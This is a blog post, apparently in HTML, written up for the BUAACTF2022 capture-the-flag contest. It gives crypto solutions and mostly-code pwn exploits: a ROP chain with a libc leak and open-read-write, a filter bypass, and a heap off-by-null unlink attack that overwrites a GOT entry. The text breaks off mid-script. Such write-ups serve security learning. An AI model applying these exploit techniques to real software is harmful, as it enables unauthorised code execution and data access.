@@ -1,0 +1,963 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <title>BUAACTF2022 WP | Iluvata&#39;s Blog</title>
+
+    
+
+
+
+
+
+<meta name="author" content="Iluvata" />
+<meta name="description" content="" />
+
+
+
+<meta name="generator" content="Hugo 0.87.0" />
+
+<link rel="canonical" href="https://iluvata.github.io/post/2022-03-28_buaactf2022/" />
+
+
+<meta property="og:title" content="BUAACTF2022 WP" />
+<meta property="og:description" content="crypto  ez game  求逆，哈希碰撞
+from pwn import * from gmpy2 import invert p = remote(&#34;101.43.185.64&#34;, &#34;43089&#34;) # p = remote(&#34;49.232.31.80&#34;, &#34;8088&#34;) p.recvuntil(&#34;y)\n&#34;) p.sendline(&#39;1&#39;) sleep(1) for i in range(300): p.recvuntil(&#34;m): (&#34;) a = int(p.recvuntil(&#34;, &#34;, drop=True)) b = int(p.recvuntil(&#34;)&#34;, drop=True)) # p.interactive() p.sendline(str(invert(a, b))) log.success(str(i)) p.interactive()  from pwn import * x = &#34;d131dd02c5e6eec4693d9a0698aff95c2fcab58712467eab4004583eb8fb7f8955ad340609f4b30283e488832571415a085125e8f7cdc99fd91dbdf280373c5bd8823e3156348f5bae6dacd436c919c6dd53e2b487da03fd02396306d248cda0e99f33420f577ee8ce54b67080a80d1ec69821bcb6a8839396f9652b6ff72a70&#34;.decode(&#34;hex&#34;) y = &#34;d131dd02c5e6eec4693d9a0698aff95c2fcab50712467eab4004583eb8fb7f8955ad340609f4b30283e4888325f1415a085125e8f7cdc99fd91dbd7280373c5bd8823e3156348f5bae6dacd436c919c6dd53e23487da03fd02396306d248cda0e99f33420f577ee8ce54b67080280d1ec69821bcb6a8839396f965ab6ff72a70&#34;.decode(&#34;hex&#34;) # print(hashlib.md5(x).hexdigest()) # print(hashlib.md5(y).hexdigest()) p = remote(&#34;49.232.31.80&#34;, &#34;8088&#34;) p.recvuntil(&#34;y)\n&#34;) p.sendline(&#39;2&#39;) sleep(2) p." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://iluvata.github.io/post/2022-03-28_buaactf2022/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2022-03-28T13:53:31+08:00" />
+<meta property="article:modified_time" content="2022-03-28T13:53:31+08:00" />
+
+
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="BUAACTF2022 WP"/>
+<meta name="twitter:description" content="crypto  ez game  求逆，哈希碰撞
+from pwn import * from gmpy2 import invert p = remote(&#34;101.43.185.64&#34;, &#34;43089&#34;) # p = remote(&#34;49.232.31.80&#34;, &#34;8088&#34;) p.recvuntil(&#34;y)\n&#34;) p.sendline(&#39;1&#39;) sleep(1) for i in range(300): p.recvuntil(&#34;m): (&#34;) a = int(p.recvuntil(&#34;, &#34;, drop=True)) b = int(p.recvuntil(&#34;)&#34;, drop=True)) # p.interactive() p.sendline(str(invert(a, b))) log.success(str(i)) p.interactive()  from pwn import * x = &#34;d131dd02c5e6eec4693d9a0698aff95c2fcab58712467eab4004583eb8fb7f8955ad340609f4b30283e488832571415a085125e8f7cdc99fd91dbdf280373c5bd8823e3156348f5bae6dacd436c919c6dd53e2b487da03fd02396306d248cda0e99f33420f577ee8ce54b67080a80d1ec69821bcb6a8839396f9652b6ff72a70&#34;.decode(&#34;hex&#34;) y = &#34;d131dd02c5e6eec4693d9a0698aff95c2fcab50712467eab4004583eb8fb7f8955ad340609f4b30283e4888325f1415a085125e8f7cdc99fd91dbd7280373c5bd8823e3156348f5bae6dacd436c919c6dd53e23487da03fd02396306d248cda0e99f33420f577ee8ce54b67080280d1ec69821bcb6a8839396f965ab6ff72a70&#34;.decode(&#34;hex&#34;) # print(hashlib.md5(x).hexdigest()) # print(hashlib.md5(y).hexdigest()) p = remote(&#34;49.232.31.80&#34;, &#34;8088&#34;) p.recvuntil(&#34;y)\n&#34;) p.sendline(&#39;2&#39;) sleep(2) p."/>
+
+
+<link rel="stylesheet" href="/css/semantic.min.css" />
+<link rel="stylesheet" href="/css/icomoon.css" />
+<link rel="stylesheet" href="/css/OverlayScrollbars.min.css" />
+<link rel="stylesheet" href="/css/github-markdown.css" />
+<link rel="stylesheet" href="/css/site.css" />
+
+<style>
+  a:hover {
+    text-decoration: underline; 
+  }
+
+  
+  a {
+    color: seagreen !important;
+  }
+  
+
+  
+  .inverted a,
+  .inverted a:hover {
+     color: darkseagreen !important;
+  }
+  
+
+  
+  body.default {
+    
+    background-color: black;
+    
+
+    
+  }
+  
+
+  
+</style>
+
+    
+
+
+
+
+
+
+  </head>
+
+  <body class="default">
+    
+<nav class="ui secondary inverted menu dream-menu">
+
+  <div class="item">
+    <i class="large link bullseye icon dream-flip-toggle" title="Flip it!"></i>
+  </div>
+  <div class="item">
+    <i class="large link home icon" title="Home" onclick="window.location.href = 'https:\/\/iluvata.github.io'"></i>
+  </div>
+  <div class="item">
+    <i class="large link icon theme-switch" onclick="themeSwitch()"></i>
+  </div>
+  
+</nav>
+
+    <div class="flip-container">
+      <div class="flipper">
+        <section class="front">
+          <div class="dream-max-width">
+            
+<div class="ui centered relaxed grid dream-grid">
+  <div class="sixteen wide mobile sixteen wide tablet twelve wide computer column markdown-body dream-single" id="dream-save-post-as-img">
+    
+    <section class="ui top attached segment">
+      <header>
+        <h1 class="ui large header">
+          BUAACTF2022 WP
+          <div class="sub header">
+            @
+            
+              Iluvata
+            
+
+            | 
+                Monday, Mar 28, 2022
+              
+
+            | 3 minutes read
+
+            | Update at
+              
+                Monday, Mar 28, 2022
+              
+          </div>
+        </h1>
+      </header>
+
+      <article class="main">
+<div id="outline-container-headline-1" class="outline-2">
+<h2 id="headline-1">
+crypto
+</h2>
+<div id="outline-text-headline-1" class="outline-text-2">
+<div id="outline-container-headline-2" class="outline-3">
+<h3 id="headline-2">
+ez game
+</h3>
+<div id="outline-text-headline-2" class="outline-text-3">
+<p>求逆，哈希碰撞</p>
+<div class="src src-python">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">from</span> gmpy2 <span style="color:#f92672">import</span> invert
+
+p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;101.43.185.64&#34;</span>, <span style="color:#e6db74">&#34;43089&#34;</span>)
+<span style="color:#75715e"># p = remote(&#34;49.232.31.80&#34;, &#34;8088&#34;)</span>
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;y)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;1&#39;</span>)
+sleep(<span style="color:#ae81ff">1</span>)
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">300</span>):
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;m): (&#34;</span>)
+    a <span style="color:#f92672">=</span> int(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;, &#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>))
+    b <span style="color:#f92672">=</span> int(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;)&#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>))
+    <span style="color:#75715e"># p.interactive()</span>
+    p<span style="color:#f92672">.</span>sendline(str(invert(a, b)))
+    log<span style="color:#f92672">.</span>success(str(i))
+p<span style="color:#f92672">.</span>interactive()</code></pre></div>
+</div>
+<div class="src src-python">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+x <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;d131dd02c5e6eec4693d9a0698aff95c2fcab58712467eab4004583eb8fb7f8955ad340609f4b30283e488832571415a085125e8f7cdc99fd91dbdf280373c5bd8823e3156348f5bae6dacd436c919c6dd53e2b487da03fd02396306d248cda0e99f33420f577ee8ce54b67080a80d1ec69821bcb6a8839396f9652b6ff72a70&#34;</span><span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;hex&#34;</span>)
+
+y <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;d131dd02c5e6eec4693d9a0698aff95c2fcab50712467eab4004583eb8fb7f8955ad340609f4b30283e4888325f1415a085125e8f7cdc99fd91dbd7280373c5bd8823e3156348f5bae6dacd436c919c6dd53e23487da03fd02396306d248cda0e99f33420f577ee8ce54b67080280d1ec69821bcb6a8839396f965ab6ff72a70&#34;</span><span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;hex&#34;</span>)
+
+<span style="color:#75715e"># print(hashlib.md5(x).hexdigest())</span>
+<span style="color:#75715e"># print(hashlib.md5(y).hexdigest())</span>
+p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;49.232.31.80&#34;</span>, <span style="color:#e6db74">&#34;8088&#34;</span>)
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;y)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;2&#39;</span>)
+sleep(<span style="color:#ae81ff">2</span>)
+
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;x:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+p<span style="color:#f92672">.</span>sendline(x)
+
+sleep(<span style="color:#ae81ff">2</span>)
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;y:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+p<span style="color:#f92672">.</span>sendline(y)
+p<span style="color:#f92672">.</span>interactive()</code></pre></div>
+</div>
+</div>
+</div>
+<div id="outline-container-headline-3" class="outline-3">
+<h3 id="headline-3">
+pow
+</h3>
+<div id="outline-text-headline-3" class="outline-text-3">
+<p>md5爆破</p>
+<div class="src src-python">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">from</span> pwnlib.util.iters <span style="color:#f92672">import</span> mbruteforce
+<span style="color:#f92672">import</span> itertools
+<span style="color:#f92672">import</span> base64
+<span style="color:#75715e"># sh = remote(&#34;chuj.top&#34;, )</span>
+<span style="color:#75715e"># sh.recvuntil(&#39;) == &#39;)</span>
+<span style="color:#75715e"># hash_code = sh.recvuntil(&#39;\n&#39;, drop=True).decode().strip()</span>
+hash_code <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;9bdd40f1971ae4ae367df318eba20f20&#39;</span>
+app <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;DNtjSOd3PV2JZqXj&#39;</span>
+log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#39;hash_code=</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">,&#39;</span><span style="color:#f92672">.</span>format(hash_code))
+charset <span style="color:#f92672">=</span> string<span style="color:#f92672">.</span>printable
+proof <span style="color:#f92672">=</span> mbruteforce(<span style="color:#66d9ef">lambda</span> x: hashlib<span style="color:#f92672">.</span>md5((x<span style="color:#f92672">+</span>app)<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest() <span style="color:#f92672">==</span>
+hash_code, charset, <span style="color:#ae81ff">4</span>, method<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;fixed&#39;</span>)
+print(proof)
+<span style="color:#75715e"># sh.sendlineafter(&#39;????&gt; &#39;, proof)</span>
+<span style="color:#75715e"># sh.interactive()</span></code></pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div id="outline-container-headline-4" class="outline-2">
+<h2 id="headline-4">
+pwn
+</h2>
+<div id="outline-text-headline-4" class="outline-text-2">
+<div id="outline-container-headline-5" class="outline-3">
+<h3 id="headline-5">
+math
+</h3>
+<div id="outline-text-headline-5" class="outline-text-3">
+<p>最后除法触发signal就给shell。但除数过滤了0，可以用INT_MIN / -1触发整数上溢。</p>
+<div class="src src-python">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;math&#34;</span>)
+p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;10.212.27.23&#34;</span>, <span style="color:#e6db74">&#34;12138&#34;</span>)
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">20</span>):
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;A = :&#34;</span>)
+    a <span style="color:#f92672">=</span> int(p<span style="color:#f92672">.</span>recvline())
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;B = :&#34;</span>)
+    b <span style="color:#f92672">=</span> int(p<span style="color:#f92672">.</span>recvline())
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;a &#34;</span>)
+    op <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1</span>)
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;b:&#34;</span>)
+    <span style="color:#66d9ef">if</span>(op <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;+&#34;</span>):
+        p<span style="color:#f92672">.</span>sendline(str(a<span style="color:#f92672">+</span>b))
+    <span style="color:#66d9ef">elif</span>(op <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;-&#34;</span>):
+        p<span style="color:#f92672">.</span>sendline(str(a<span style="color:#f92672">-</span>b))
+    <span style="color:#66d9ef">elif</span>(op <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;*&#34;</span>):
+        p<span style="color:#f92672">.</span>sendline(str(a<span style="color:#f92672">*</span>b))
+p<span style="color:#f92672">.</span>interactive()</code></pre></div>
+</div>
+</div>
+</div>
+<div id="outline-container-headline-6" class="outline-3">
+<h3 id="headline-6">
+oj &amp; oj_revenge
+</h3>
+<div id="outline-text-headline-6" class="outline-text-3">
+<p>第一个题直接fopen就能拿到flag。第二个也只对关键字 <code class="verbatim">flag</code> , <code class="verbatim">open</code> 之类的做了简单过滤，没有禁用。用宏绕过就行。</p>
+<div class="src src-c">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#define x f##o##p##e##n
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
+{
+<span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">233</span>];
+<span style="color:#66d9ef">char</span> ff[<span style="color:#ae81ff">10</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./fla&#34;</span>;
+ff[<span style="color:#ae81ff">5</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;g&#39;</span>;
+FILE <span style="color:#f92672">*</span>fd <span style="color:#f92672">=</span> x(ff, <span style="color:#e6db74">&#34;r&#34;</span>);
+fgets(buf, <span style="color:#ae81ff">233</span>, fd);
+printf(buf);
+}</code></pre></div>
+</div>
+</div>
+</div>
+<div id="outline-container-headline-7" class="outline-3">
+<h3 id="headline-7">
+拿到shell是一件很嘻哈的事
+</h3>
+<div id="outline-text-headline-7" class="outline-text-3">
+<p><a href="/img/2022-03-28_shell.png">ida</a>
+ida看一眼，发现是orw+rop。</p>
+<div class="src src-shell">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">ubuntu@pwn:~/bridge/buaactf2022/pwn/shell$ seccomp-tools dump ./shell
+ line  CODE  JT   JF      K
+<span style="color:#f92672">=================================</span>
+ 0000: 0x20 0x00 0x00 0x00000004  A <span style="color:#f92672">=</span> arch
+ 0001: 0x15 0x00 0x02 0xc000003e  <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>A !<span style="color:#f92672">=</span> ARCH_X86_64<span style="color:#f92672">)</span> goto <span style="color:#ae81ff">0004</span>
+ 0002: 0x20 0x00 0x00 0x00000000  A <span style="color:#f92672">=</span> sys_number
+ 0003: 0x15 0x00 0x01 0x0000003b  <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>A !<span style="color:#f92672">=</span> execve<span style="color:#f92672">)</span> goto <span style="color:#ae81ff">0005</span>
+ 0004: 0x06 0x00 0x00 0x00000000  <span style="color:#66d9ef">return</span> KILL
+ 0005: 0x06 0x00 0x00 0x7fff0000  <span style="color:#66d9ef">return</span> ALLOW
+ubuntu@pwn:~/bridge/buaactf2022/pwn/shell$</code></pre></div>
+</div>
+<p>seccomp-tools看到只禁用了execve。那就先泄漏puts的got得到libc基地址，把 &#34;./flag&#34; 字符串写入data段，orw拿到flag。</p>
+<div class="src src-python">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./shell&#34;</span>)
+<span style="color:#75715e"># p = remote(&#34;10.212.27.23&#34;, &#34;4396&#34;)</span>
+libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc-2.27.so&#34;</span>)
+elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./shell&#34;</span>)
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;:)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+rdiret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000400863</span>
+<span style="color:#75715e"># leak</span>
+payload1 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x20</span><span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>)<span style="color:#f92672">+</span>p64(rdiret)<span style="color:#f92672">+</span>p64(elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;puts&#39;</span>])<span style="color:#f92672">+</span>p64(elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;puts&#39;</span>])<span style="color:#f92672">+</span>p64(elf<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;main&#39;</span>])
+p<span style="color:#f92672">.</span>sendline(payload1)
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;guess</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+putsaddr <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x7f</span><span style="color:#e6db74">&#34;</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
+libcbase <span style="color:#f92672">=</span> putsaddr <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;puts&#39;</span>]
+log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;libc base: &#34;</span> <span style="color:#f92672">+</span> hex(libcbase))
+
+o <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;open&#39;</span>]<span style="color:#f92672">+</span>libcbase
+r <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;read&#39;</span>]
+w <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;puts&#39;</span>]
+rsir15ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x400861</span>
+rdxrsiret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00130539</span><span style="color:#f92672">+</span>libcbase
+rdxret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x01b96</span><span style="color:#f92672">+</span>libcbase
+<span style="color:#75715e"># write file name</span>
+payload2 <span style="color:#f92672">=</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x20</span><span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>)<span style="color:#f92672">+</span>p64(rdiret)<span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">+</span>p64(rdxrsiret)<span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">16</span>)<span style="color:#f92672">+</span>p64(elf<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;__data_start&#39;</span>])<span style="color:#f92672">+</span>\
+    p64(r)<span style="color:#f92672">+</span>p64(elf<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;main&#39;</span>])
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;:)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+p<span style="color:#f92672">.</span>sendline(payload2)
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;guess</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;./flag</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)
+<span style="color:#75715e"># orw</span>
+pushraxret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x001b4d0</span><span style="color:#f92672">+</span>libcbase
+payload3 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x28</span><span style="color:#f92672">+</span>p64(rdiret)<span style="color:#f92672">+</span>p64(elf<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;__data_start&#39;</span>])<span style="color:#f92672">+</span>p64(rdxrsiret)<span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">+</span>p64(o)<span style="color:#f92672">+</span>p64(elf<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;main&#39;</span>])
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;:)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+p<span style="color:#f92672">.</span>sendline(payload3)
+payload3 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x28</span><span style="color:#f92672">+</span>p64(rdiret)<span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0x3</span>)<span style="color:#f92672">+</span>p64(rdxrsiret)<span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">30</span>)<span style="color:#f92672">+</span>p64(elf<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;__data_start&#39;</span>])<span style="color:#f92672">+</span>p64(r)
+payload3 <span style="color:#f92672">+=</span> p64(rdiret)<span style="color:#f92672">+</span>p64(elf<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;__data_start&#39;</span>])<span style="color:#f92672">+</span>p64(w)
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;:)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+p<span style="color:#f92672">.</span>sendline(payload3)
+p<span style="color:#f92672">.</span>interactive()</code></pre></div>
+</div>
+</div>
+</div>
+<div id="outline-container-headline-8" class="outline-3">
+<h3 id="headline-8">
+dream
+</h3>
+<div id="outline-text-headline-8" class="outline-text-3">
+<p>libc2.34下的堆题。
+<a href="/img/2022-03-28_new-dream.png">new-dream</a>
+new_dream是read后没有写入&#39;\x00&#39;，有信息泄漏。INDEX没有限制上限，可以无限创建新dream；但其实bss里只能放下8个地址，再往后就会覆盖SIZES。可以利用这点来修改SIZES，使得在edit_dream时可以覆盖下一堆块。
+<a href="/img/2022-03-28_bss.png">dream-bss</a>
+<a href="/img/2022-03-28_edit-dream.png">edit-dream</a>
+edit_dream有off-by-null。</p>
+<p>
+那么就可以用edit时的off-by-null让下一堆块认为上一块not in use，触发unlink后可以任意读写。
+<a href="/img/2022-03-28_unlink.jpeg">unlink</a>
+通过读HEAP_PTRS内容拿到堆地址，再计算堆内偏移，读到dream1中保存的unsorted bin addr，leak libc base.</p>
+<div class="src src-python">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># leak</span>
+edit_dream(<span style="color:#ae81ff">1</span>, p64(<span style="color:#ae81ff">0x4040a0</span>))
+read_dream(<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>)
+heap_addr <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Do&#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
+log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;dream 0 addr: &#34;</span><span style="color:#f92672">+</span> hex(heap_addr))
+edit_dream(<span style="color:#ae81ff">1</span>, p64(heap_addr<span style="color:#f92672">-</span><span style="color:#ae81ff">0x10</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x90</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x20</span>))
+read_dream(<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>)
+unsorted_addr <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Do&#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
+libc_base <span style="color:#f92672">=</span> unsorted_addr <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x219cc0</span>
+log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;libc base: &#34;</span><span style="color:#f92672">+</span>hex(libc_base))</code></pre></div>
+</div>
+<p>注意libc2.34中取消了free_hook和malloc_hook，不能通过重写hook来执行system。好在这题只开了partial RELRO，可以写got。往free@got写入system，delete_dream触发拿到shell。</p>
+<p>
+完整exp：</p>
+<div class="src src-python">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./dream&#34;</span>)
+p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;10.212.27.23&#34;</span>, <span style="color:#e6db74">&#34;8012&#34;</span>)
+libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc.so.6&#34;</span>)
+libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;/home/ubuntu/glibc-all-in-one/libs/2.34-0ubuntu3_amd64/libc.so.6&#34;</span>)
+elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./dream&#34;</span>)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">new_dream</span>(length, content):
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;&gt; &#34;</span>, <span style="color:#e6db74">&#34;1&#34;</span>)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;How long is your dream?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, str(length))
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34; contents of this dream?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, str(content))
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">read_dream</span>(ind):
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;&gt; &#34;</span>, <span style="color:#e6db74">&#34;2&#34;</span>)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;Which dream would you like to read?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, str(ind))
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">edit_dream</span>(ind, content):
